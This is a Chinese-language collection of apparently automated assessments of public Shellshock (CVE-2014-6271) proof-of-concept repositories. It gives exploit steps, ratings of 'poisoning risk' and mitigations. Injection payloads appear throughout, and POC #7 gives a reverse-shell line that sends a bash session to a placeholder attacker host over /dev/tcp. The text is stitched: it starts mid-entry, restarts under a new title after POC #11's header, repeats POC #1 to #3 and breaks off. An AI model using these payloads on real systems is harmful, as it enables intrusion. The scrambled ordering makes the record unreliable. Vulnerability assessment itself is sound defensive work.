**影响应用:** GNU Bash

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意代码。

**影响版本:** GNU Bash 1.14 至 4.3

**利用条件:** 目标系统需要运行存在漏洞的Bash版本，并且通过CGI脚本、OpenSSH ForceCommand或其他方式暴露了环境变量注入点。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，在Bash执行时注入并执行任意命令。利用方式通常涉及以下步骤：

1.  **确定攻击目标：** 寻找使用Bash处理请求的应用程序或服务，例如CGI脚本、OpenSSH服务器（使用ForceCommand）或DHCP客户端。
2.  **构造恶意环境变量：** 创建一个包含函数定义和恶意命令的环境变量。例如：`() { :; }; echo vulnerable`
3.  **发送包含恶意环境变量的请求：** 将构造的环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
4.  **触发漏洞执行：** 当目标系统执行Bash并处理包含恶意环境变量的请求时，漏洞将被触发，导致恶意命令执行。

提供的Python POC脚本 `shellshock.py` 旨在利用此漏洞。该脚本接受目标URL、攻击者IP地址（LHOST）和端口（LPORT）作为参数。它通过构造包含反向shell命令的User-Agent头，向目标URL发送HTTP GET请求。如果目标系统存在漏洞，它将执行反向shell命令，允许攻击者连接到目标系统并执行任意命令。

**关于投毒风险的分析：**

代码中主要功能是利用Shellshock漏洞，建立反向连接。审查代码，发现可能存在轻微投毒风险的地方在于，攻击者可以修改payload，执行任意命令。但是，由于脚本本身就是为了利用漏洞而设计的，因此，这不算是作者有意植入的后门，而是漏洞利用本身的性质决定的。

  * LICENSE和README.md文件相对标准，没有发现恶意代码。
  * `shellshock.py`脚本，虽然主要功能是漏洞利用，但如果被不道德的人使用，仍然会产生危害。

综合评估，该仓库的投毒风险较低，大约在5%左右。主要风险在于脚本被恶意使用，而非代码本身包含隐藏的恶意功能。

**项目地址:** [AlissonFaoli/Shellshock](https://github.com/AlissonFaoli/Shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #3

**来源**: [CVE-2014-6271-Brandaoo_CVE-2014-6271.md](../2014/CVE-2014-6271-Brandaoo_CVE-2014-6271.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统需要使用Bash，并且存在允许通过环境变量传递参数的场景，例如CGI脚本，OpenSSH ForceCommand等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过在环境变量中构造恶意的函数定义，从而在Bash执行时注入并执行任意代码。该漏洞的利用方式是：

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值包含函数定义，Bash会先执行函数定义之后的内容。如果函数定义后的字符串包含恶意代码，则会被执行。
2.  **利用方式：** 攻击者构造包含恶意代码的环境变量，例如 `(){ :; }; /usr/bin/id`，然后将该环境变量传递给目标系统。
3.  **触发点：** 目标系统上运行的Bash脚本或程序在执行时，会解析并处理这些环境变量，从而触发漏洞，执行攻击者注入的恶意代码。
4.  **POC分析：** 提供的`shellshock.sh`脚本通过`curl`命令发送带有特殊构造的`User-Agent`头的HTTP请求。`User-Agent`头的内容为 `() { :; }; echo VULNERABLE`。如果目标网站的服务器使用Bash处理HTTP请求头（例如，通过CGI脚本），并且Bash存在Shellshock漏洞，那么`echo VULNERABLE`命令会被执行，并在HTTP响应中返回 "VULNERABLE" 字符串，脚本据此判断目标站点存在漏洞。
5.  **有效性分析：** 该POC代码基本有效，可以用于检测目标服务器是否存在Shellshock漏洞。但是，该脚本的检测方法较为简单，仅通过`User-Agent`头进行检测，可能存在一定的漏报情况。更复杂的利用场景可能需要修改POC代码。
6.  **投毒风险分析：** 该仓库中存在一定的投毒风险。`shellshock.sh`本身的代码较为简单，主要功能是发送HTTP请求并检查响应。潜在的风险在于：
    *   **依赖项风险：** 虽然脚本本身只依赖于`curl`，但是如果攻击者修改脚本，引入其他的外部命令或者脚本，可能会引入恶意代码。
    *   **命令注入风险：** 虽然脚本避免了直接执行用户输入，但是，如果攻击者能够控制`curl`的参数或者其他命令的参数，仍然可能存在命令注入的风险。
    *  **README.md风险:** 有攻击者会修改README.md文件，放入恶意链接，诱导用户点击。
    根据代码的复杂度、依赖项以及潜在的命令注入风险，估计投毒风险为10%。

**项目地址:** [Brandaoo/CVE-2014-6271](https://github.com/Brandaoo/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #4

**来源**: [CVE-2014-6271-Dilith006_CVE-2014-6271.md](../2014/CVE-2014-6271-Dilith006_CVE-2014-6271.md)

## CVE-2014-6271-Bash-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在Bash并且可以通过某种方式设置环境变量。常见的攻击场景包括：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid、DHCP客户端等。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为“Shellshock”，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后尾随字符串的方式存在缺陷，这使得攻击者可以通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性：**
根据漏洞库信息、搜索结果，以及常见利用方式，该漏洞的PoC是有效的。漏洞库信息中列出了多个Expolit-DB的链接,以及许多厂商的确认信息,证明该漏洞的真实性。搜索结果也显示了大量的关于该漏洞的分析和利用案例。提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`，从文件名和路径来看，仅仅是一个README文件，内容只有`# CVE-2014-6271`，没有可执行的代码，但可以作为漏洞存在的标志。

**投毒风险：**
提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`的内容非常简单，几乎没有投毒代码的可能性。但是，由于该仓库本身存在于`/tmp`目录下，存在被恶意替换或者植入恶意脚本的可能性，因此具有一定的投毒风险。但是从代码本身来看，投毒风险极低,给出的预估值为10%。

**利用方式：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/bash -c "恶意命令"`。
2.  **触发漏洞：** 将构造的环境变量传递给存在漏洞的Bash实例。这可以通过多种方式实现，例如：
    *   **HTTP请求：** 如果目标系统使用CGI脚本，可以通过修改HTTP请求头（如User-Agent）来设置环境变量。
    *   **SSH：** 如果OpenSSH启用了`ForceCommand`，可以通过设置环境变量来执行命令。
    *   **DHCP：** 某些DHCP客户端在执行脚本时会使用环境变量。
3.  **代码执行：** 当Bash解析包含恶意代码的环境变量时，会执行其中的命令，从而实现远程代码执行。

**总结：**
Shellshock是一个严重的安全漏洞，利用方式简单，影响范围广泛。虽然漏洞本身发布时间较早，但仍然可能存在于未及时更新的系统中。由于PoC的特殊性，直接利用README.md是不可能的，需要配合其他可执行的EXP进行测试。

**项目地址:** [Dilith006/CVE-2014-6271](https://github.com/Dilith006/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #5

**来源**: [CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md](../2014/CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本，且配置不当允许通过HTTP Headers传递环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过在环境变量中嵌入恶意代码，当Bash shell执行这些环境变量时，从而执行任意命令。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞利用代码（Shellshock.py）有效。 搜索结果中多个链接都指向了该漏洞的细节和利用方法，证明了该漏洞的可利用性。漏洞利用代码本身也提供了两种payload：反向shell和文件浏览，具有一定的利用价值。

**投毒风险：**
分析提供的Python脚本 `Shellshock.py` ，代码主体结构清晰，主要功能是构造包含恶意代码的HTTP请求头，并发送到目标服务器。代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **payload的可定制性：** 脚本允许用户自定义payload，这本身不是问题。但如果攻击者替换或修改了默认的payload生成方式，可能会插入恶意代码，例如，下载并执行其他恶意脚本。
*   **CGI路径：** 脚本中包含一些常见的CGI路径，攻击者可能通过修改这些路径来尝试不同的攻击目标。
*   **回连地址：** reverse shell需要指定lhost和lport，如果作者在代码中预设了后门地址，可能导致攻击者在不知情的情况下，将shell反弹给作者。但是，代码中这两个参数由用户指定，降低了直接投毒的风险。
*   **代码混淆：** 代码没有进行明显的混淆，可读性较强，降低了隐藏恶意代码的概率。

综合考虑，认为此POC存在10%的投毒风险，主要是因为payload的可定制性，可能被用于传播修改后的恶意脚本。需要仔细审查代码，尤其关注payload生成和CGI路径部分。

**利用方式：**
利用方式是利用Bash解析环境变量时存在的漏洞，通过构造恶意的HTTP请求头（例如Cookie或Referer），在其中嵌入包含恶意代码的函数定义。当目标服务器上的Bash shell执行CGI脚本时，会解析这些HTTP头，从而触发漏洞，执行攻击者注入的命令。具体步骤如下：

1.  **确定目标：** 找到存在CGI脚本且可能受Shellshock影响的服务器。
2.  **构造Payload：** 根据需要选择payload类型（反向shell或文件浏览），并设置相应的参数（例如lhost、lport、echo）。
3.  **发送请求：** 使用`Shellshock.py`脚本构造包含恶意payload的HTTP请求，并发送到目标服务器的CGI脚本。
4.  **执行命令：** 如果目标存在漏洞，Bash shell会执行payload中的恶意代码，例如建立反向shell连接或执行文件浏览命令，并将结果返回给攻击者。

**项目地址:** [FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-](https://github.com/FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #6

**来源**: [CVE-2014-6271-Gurguii_cgi-bin-shellshock.md](../2014/CVE-2014-6271-Gurguii_cgi-bin-shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过其他方式设置环境变量并调用Bash

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的通过环境变量执行任意命令。利用方式如下：

1.  **有效性：** 提供的Python和Bash脚本都是有效的PoC代码。它们通过设置包含恶意代码的环境变量，然后尝试通过HTTP请求触发漏洞。
2.  **投毒风险：** 尽管代码主要用于利用Shellshock漏洞，但仍然存在轻微的投毒风险。具体分析如下：
    *   **README.md:**  该文件仅包含使用说明，无投毒代码。
    *   **shellshock.py:** Python脚本通过`requests`库发送HTTP请求，如果攻击者的服务器被攻陷，或者服务器返回恶意重定向，那么可能存在风险。但是代码本身没有明显的恶意代码。
    *   **shellshock.sh:** Bash脚本使用`curl`命令，同样存在curl命令被其他程序劫持，或者DNS投毒的风险。
    *  脚本接受用户提供的URL、LHOST和LPORT，如果用户使用了恶意的URL，可能会被服务器端记录或者进行其他攻击。这些不是脚本投毒，而是用户使用不当造成的。
    综合分析，主要风险在于依赖的外部命令(`curl`,`requests`)可能存在风险，以及用户使用脚本不当的风险,投毒风险较低，初步判定为10%。
3.  **利用方式：**
    *   **通过User-Agent头：**  PoC代码通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量发送到目标服务器。如果目标服务器上的CGI脚本或其他应用程序调用Bash来处理该请求，那么恶意代码就会被执行。
    *   **反弹Shell：**  PoC代码可以配置LHOST和LPORT参数，用于接收目标服务器的反弹Shell。攻击者可以在自己的机器上监听指定的端口，当目标服务器执行恶意代码时，会主动连接攻击者的机器，从而建立反弹Shell连接。
    *   **交互式命令执行：**  PoC代码也支持交互式命令执行。攻击者可以输入任意命令，PoC代码会将命令注入到环境变量中，并发送到目标服务器执行。

**搜索引擎结果补充：** 搜索引擎结果证实了该漏洞的严重性和广泛影响，并提供了一些检测和利用该漏洞的资源。

**项目地址:** [Gurguii/cgi-bin-shellshock](https://github.com/Gurguii/cgi-bin-shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #7

**来源**: [CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md](../2014/CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且存在可以通过环境变量传递参数的CGI脚本或其他服务。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的远程命令执行漏洞。漏洞的根源在于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，利用诸如Apache HTTP Server的mod_cgi模块、OpenSSH的ForceCommand功能、DHCP客户端脚本等场景，跨越权限边界执行任意shell命令。

**有效性评估：**

提供的漏洞利用代码（shellshock_exploit.py）旨在利用Shellshock漏洞，通过向目标URL发送特制的HTTP请求，其中User-Agent头包含恶意Bash代码，从而在目标服务器上执行任意命令。

README.md 文件中提供了检测和利用该漏洞的步骤。

根据漏洞库信息和搜索结果，该漏洞是一个广泛存在的严重漏洞，影响大量系统和服务。提供的POC代码与漏洞描述一致，因此，该POC代码**有效**。

**投毒风险评估：**

检查`shellshock_exploit.py`脚本和`README.md`文件，未发现明显的恶意代码。脚本的主要功能是构造包含漏洞利用代码的HTTP请求，并在本地监听反弹shell。风险点可能在于以下几点：

1.  **Payload定制：** 脚本允许指定LHOST和LPORT，如果用户不小心使用了错误的IP地址或端口，可能会导致连接到恶意服务器。
2.  **依赖性：** 脚本依赖于`requests`库，如果安装了被篡改的`requests`库，可能会存在风险。
3.  **Netcat依赖：** 脚本依赖于本地的 `nc` 命令, 如果本地的 `nc` 命令被恶意替换, 可能存在风险。

总体而言，该代码的投毒风险较低，主要集中在使用者的误操作和对外部依赖项的信任上。投毒风险估计为10%。

**漏洞利用方式：**

1.  **确定目标：** 找到运行存在漏洞Bash版本的服务器，并且该服务器运行着可以通过环境变量传递参数的服务，例如CGI脚本。
2.  **构造Payload：** 构造包含恶意Bash代码的环境变量，例如：`() { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
3.  **发送请求：** 通过HTTP请求或其他方式将构造的Payload作为环境变量传递给目标服务器。
4.  **执行命令：** 目标服务器上的Bash解释器会执行恶意代码，从而执行攻击者指定的命令。
5.  **反弹Shell：** 在上面的Payload示例中，恶意代码会尝试创建一个反弹Shell，将目标服务器的Shell连接到攻击者的IP地址和端口。

**缓解措施：**

1.  升级Bash到最新版本。
2.  检查和更新所有使用Bash脚本的服务，确保它们不会受到环境变量的影响。
3.  使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [Jsmoreira02/CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #8

**来源**: [CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md](../2014/CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许设置环境变量并调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后trailing string的方式。攻击者可以利用此漏洞，通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性分析：**
提供的Python POC代码通过发送包含恶意构造的HTTP请求来利用此漏洞。它首先尝试通过User-Agent、Referer和Cookie头注入测试payload来检测漏洞是否存在，测试Payload特征是会输出特定字符串，验证是否可以执行代码，存在漏洞后再注入包含反向Shell的payload来利用该漏洞。

**投毒风险分析：**
代码存在潜在的投毒风险，主要体现在以下几个方面：
1.  **反向Shell地址：** 攻击者可能修改`lhost`和`lport`变量，将反向Shell指向恶意服务器，从而控制受害者机器。当前代码中并没有明显的恶意行为，但是依赖用户提供的参数。
2.  **Payload修改：** 攻击者可能修改`payload`变量，执行其他恶意命令，例如下载并执行恶意文件，删除系统文件等。当前Payload是反向shell，不属于投毒行为。
3.  **其他依赖：** 代码依赖于`pwncat`库，这个库本身可能存在安全问题或被篡改，从而引入新的安全风险。
4. **连接处理:** `pwncat.manager.Manager` 中可能包含未知的后门或恶意代码。 
综合来看，投毒风险较低（约10%），主要来自于参数修改和对依赖库的信任。

**利用方式：**
1.  **漏洞检测：**  POC首先向目标URL发送包含特殊构造header的HTTP请求(User-Agent, Referer, Cookie)。 这些header中包含恶意的Bash函数定义。
2.  **命令执行：**  如果目标系统存在漏洞，Bash在解析这些环境变量时，会执行注入的恶意代码。
3.  **反向Shell：**  利用代码中，注入的Payload为反向Shell，建立从目标系统到攻击者控制机器的TCP连接，从而允许攻击者远程控制目标系统。反向连接的地址由`lhost`和`lport`指定。
4. **监听连接:** 在攻击机上启动监听进程，等待目标机器的连接。

**漏洞缓解措施：**
*   升级Bash到最新版本。
*   避免在CGI脚本中使用Bash处理用户输入。
*   使用安全编码实践，验证所有用户输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）监控和阻止恶意流量。

**项目地址:** [K3ysTr0K3R/CVE-2014-6271-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2014-6271-EXPLOIT)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #9

**来源**: [CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md](../2014/CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md)

## CVE-2014-6271 IP Fire Shellshock RCE

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** IPFire

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 2.15

**利用条件:** 目标系统运行存在漏洞的Bash版本，且可以通过HTTP(S)访问到受影响的CGI脚本 (index.cgi)。可能需要用户名和密码进行身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造恶意的环境变量来执行任意代码。提供的Python POC代码专门针对IPFire防火墙<=2.15版本。利用方式如下：

1.  **漏洞原理：** Bash在处理环境变量时，允许在函数定义后附加额外的命令。如果这些环境变量被传递给执行Bash脚本的CGI程序，附加的命令就会被执行。
2.  **攻击向量：**  攻击者通过HTTP请求的header中设置包含恶意代码的环境变量，利用IPFire的`index.cgi`脚本触发漏洞。
3.  **POC代码分析：** 该POC首先尝试连接到目标IPFire服务器，如果需要则进行HTTP基本身份验证。然后，它构造一个包含恶意Bash代码的环境变量，并通过HTTP请求的headers将其发送到`index.cgi`。恶意代码利用函数定义后的trailing string执行任意命令。POC还包含了一个伪shell，允许交互式地执行命令。
4.  **投毒风险分析：** POC代码主要功能是漏洞验证和利用，但仍存在一定投毒风险。例如：
    *   代码中包含`eval`或`exec`等执行任意代码的函数，虽然目前用于执行用户输入的命令，但攻击者可能修改这些部分来执行恶意代码。
    *   该脚本依赖于`requests`库，攻击者可能篡改此脚本，要求安装恶意依赖包，从而执行恶意代码
    *  该脚本在执行远程命令后直接打印到输出，没有进行过滤，如果远程服务器被入侵，可能会发送恶意字符到客户端，导致客户端被攻击。
  因此，保守估计存在10%的投毒风险，主要集中在潜在的恶意依赖、命令执行的输出处理以及代码篡改的可能性。

**总结：** 提供的POC代码利用Shellshock漏洞，通过构造包含恶意Bash代码的环境变量，实现在目标IPFire系统上执行任意命令。由于利用了HTTP(S)协议，攻击通常可以通过网络远程发起。尽管漏洞已经存在多年，但仍然有很多系统没有修复，因此该漏洞仍然具有较高的现实威胁。

**项目地址:** [MuirlandOracle/CVE-2014-6271-IPFire](https://github.com/MuirlandOracle/CVE-2014-6271-IPFire)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #10

**来源**: [CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md](../2014/CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md)

## CVE-2014-6271 Shellshock漏洞利用

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且存在可利用的攻击面，如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash shell中的高危漏洞。该漏洞允许攻击者通过在环境变量中注入恶意代码来执行任意命令。根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，以下是对漏洞利用有效性、投毒风险和利用方式的分析：

**有效性：**

根据漏洞库信息，CVE-2014-6271允许远程攻击者通过特制的环境变量执行任意代码。漏洞利用代码（README.md）提供了一个利用 `exploit/multi/http/apache_mod_cgi_bash_env_exec` 模块的Metasploit POC，用于攻击运行CGI脚本的Apache服务器。多个搜索引擎结果，如NVD, CISA, Qualys等，也确认了该漏洞的存在和危害，并提供了缓解措施。综合来看，提供的POC代码是有效的。

**投毒风险：**

漏洞利用代码本身是 Metasploit 模块的配置说明，用于利用已知的 Shellshock 漏洞。直接分析 README.md 文件，投毒风险较低，但仍存在以下风险：

*   **作者恶意修改：** 理论上，作者可能在提供文件的其他地方（例如，如果存在其他脚本或配置）隐藏了恶意代码。但仅根据提供信息无法判断。
*   **依赖项风险：** Metasploit 模块本身依赖于 Metasploit Framework，如果 Metasploit Framework 被篡改，可能存在风险。

综合评估，投毒风险较低，约为10%。主要来自于潜在的未公开文件篡改。

**利用方式：**

1.  **确定目标：** 找到运行Bash，且存在CGI脚本或其他途径可以设置环境变量的系统。
2.  **发送恶意请求：** 构造包含恶意代码的环境变量。常见的攻击方式是通过HTTP请求头，特别是当服务器使用CGI脚本处理请求时。HTTP头会被转换为环境变量传递给Bash。
3.  **代码执行：** 当Bash处理包含恶意代码的环境变量时，会执行注入的命令。
4.  **反弹shell（POC中的PAYLOAD）：**  利用 `cmd/unix/reverse_netcat` payload在目标主机上执行`nc`，反弹shell到攻击者的机器。

**防范措施：**

*   立即更新 Bash 到最新版本。
*   禁用未使用的 CGI 脚本。
*   使用 Web 应用防火墙 (WAF) 过滤恶意请求。
*   监控 HTTP 请求日志。

**项目地址:** [RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis](https://github.com/RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #11

**来源**: [CVE-2014-6271-RadYio_CVE-2014-6271.md](../2014/CVE-2014-6271-RadYio_CVE-2014-6271.md)

# CVE-2014-6271

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2014-6271-0xN7y_CVE-2014-6271.md](../2014/CVE-2014-6271-0xN7y_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量与Bash交互

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，也被称为ShellShock，是GNU Bash中的一个高危漏洞。攻击者可以通过构造包含恶意代码的环境变量，利用Bash解析函数定义时存在的缺陷来执行任意命令。漏洞利用方式如下：

1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，则会尝试执行函数定义后面的字符串。如果攻击者能够控制环境变量的内容，就可以注入恶意代码。

2.  **利用方式：** 攻击者通常通过以下几种方式注入环境变量：
    *   **HTTP请求头：** 如果Web服务器使用CGI脚本，攻击者可以在HTTP请求头中设置包含恶意代码的环境变量，例如User-Agent。
    *   **SSH ForceCommand：** 在OpenSSH配置中，ForceCommand选项允许在用户登录时强制执行特定命令。攻击者可以利用此选项设置包含恶意代码的环境变量。
    *   **DHCP客户端：** DHCP客户端在请求IP地址时，可以设置环境变量。攻击者可以伪造DHCP服务器，向受害者发送包含恶意代码的DHCP响应。

3.  **POC分析：** 提供的POC代码 `CVE-2014-6271.py`  通过构造包含恶意代码的User-Agent HTTP头来利用此漏洞。脚本接受目标URL和要执行的命令作为参数，然后向目标URL发送包含特制User-Agent头的HTTP请求。
    *   **有效性：** 该POC代码有效，如果目标系统存在漏洞，可以执行任意命令。
    *   **投毒风险：**  查看提供的POC代码，未发现明显的投毒代码。代码结构清晰，功能明确，主要目的是发送包含漏洞利用代码的HTTP请求。**因此投毒风险为0%**。

4.  **缓解措施：**
    *   升级Bash到最新版本。
    *   检查并修复所有可能受到漏洞影响的应用程序和服务，例如Web服务器、OpenSSH和DHCP客户端。
    *   限制CGI脚本的使用，并对所有输入进行严格的验证。

根据搜索引擎的结果，该漏洞是一个严重的互联网基础设施风险，因为许多常见的配置都允许远程代码执行。一些供应商已经发布了补丁来解决这个问题。因此，使用提供的POC代码进行漏洞验证是合理的，但需要注意潜在的风险。

**项目地址:** [0xN7y/CVE-2014-6271](https://github.com/0xN7y/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #2

**来源**: [CVE-2014-6271-AlissonFaoli_Shellshock.md](../2014/CVE-2014-6271-AlissonFaoli_Shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意代码。

**影响版本:** GNU Bash 1.14 至 4.3

**利用条件:** 目标系统需要运行存在漏洞的Bash版本，并且通过CGI脚本、OpenSSH ForceCommand或其他方式暴露了环境变量注入点。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，在Bash执行时注入并执行任意命令。利用方式通常涉及以下步骤：

1.  **确定攻击目标：** 寻找使用Bash处理请求的应用程序或服务，例如CGI脚本、OpenSSH服务器（使用ForceCommand）或DHCP客户端。
2.  **构造恶意环境变量：** 创建一个包含函数定义和恶意命令的环境变量。例如：`() { :; }; echo vulnerable`
3.  **发送包含恶意环境变量的请求：** 将构造的环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
4.  **触发漏洞执行：** 当目标系统执行Bash并处理包含恶意环境变量的请求时，漏洞将被触发，导致恶意命令执行。

提供的Python POC脚本 `shellshock.py` 旨在利用此漏洞。该脚本接受目标URL、攻击者IP地址（LHOST）和端口（LPORT）作为参数。它通过构造包含反向shell命令的User-Agent头，向目标URL发送HTTP GET请求。如果目标系统存在漏洞，它将执行反向shell命令，允许攻击者连接到目标系统并执行任意命令。

**关于投毒风险的分析：**

代码中主要功能是利用Shellshock漏洞，建立反向连接。审查代码，发现可能存在轻微投毒风险的地方在于，攻击者可以修改payload，执行任意命令。但是，由于脚本本身就是为了利用漏洞而设计的，因此，这不算是作者有意植入的后门，而是漏洞利用本身的性质决定的。

  * LICENSE和README.md文件相对标准，没有发现恶意代码。
  * `shellshock.py`脚本，虽然主要功能是漏洞利用，但如果被不道德的人使用，仍然会产生危害。

综合评估，该仓库的投毒风险较低，大约在5%左右。主要风险在于脚本被恶意使用，而非代码本身包含隐藏的恶意功能。

**项目地址:** [AlissonFaoli/Shellshock](https://github.com/AlissonFaoli/Shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #3

**来源**: [CVE-2014-6271-Brandaoo_CVE-2014-6271.md](../2014/CVE-2014-6271-Brandaoo_CVE-2014-6271.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统需要使用Bash，并且存在允许通过环境变量传递参数的场景，例如CGI脚本，OpenSSH ForceCommand等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

